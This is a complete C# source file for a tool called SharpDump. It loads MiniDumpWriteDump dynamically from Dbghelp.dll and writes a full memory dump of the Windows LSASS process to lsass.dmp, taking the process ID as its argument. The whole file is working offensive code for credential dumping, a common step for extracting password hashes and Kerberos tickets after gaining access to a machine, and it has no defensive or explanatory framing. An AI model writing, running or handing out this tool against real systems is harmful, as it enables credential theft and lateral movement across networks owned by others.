using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;

namespace SharpDump
{
    class Program
    {
        //import Win32API
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string dll);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string name);

        //delegate MiniDumpWriteDump Function
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool  MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        static int Main(string[] args)
        {
            if (args.Length==0) {
                Console.WriteLine("[-] Usage SharpDump.exe Lsass.exe's Pid");
                Console.WriteLine("[-] Example SharpDump.exe 1120");
                return 1;
            }
            bool bSuccess = false;
            string filename = "lsass.dmp";

            FileStream fs = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);

            IntPtr createPtr = GetProcAddress(LoadLibrary("Dbghelp.dll"), "MiniDumpWriteDump");
            MiniDumpWriteDump miniDumpWriteDump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(createPtr, typeof(MiniDumpWriteDump));

            Console.WriteLine("[+] MiniDumpWriteDump found at 0x{0}", createPtr.ToString("X"));

            Int32 ProcessID = Convert.ToInt32(args[0]);
            Process process = Process.GetProcessById(ProcessID);

            bSuccess = miniDumpWriteDump(process.Handle, (uint)process.Id, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[+] Process Completed ({0})", bSuccess);

            if (bSuccess)
            {
                Console.WriteLine($"[+] lsass process dumped successfully and saved at {Directory.GetCurrentDirectory()}\\{filename}");
            }
            else
            {
                Console.WriteLine("[-] Cannot Dump Lsass.");
            }
            return 0;
        }
    }
}
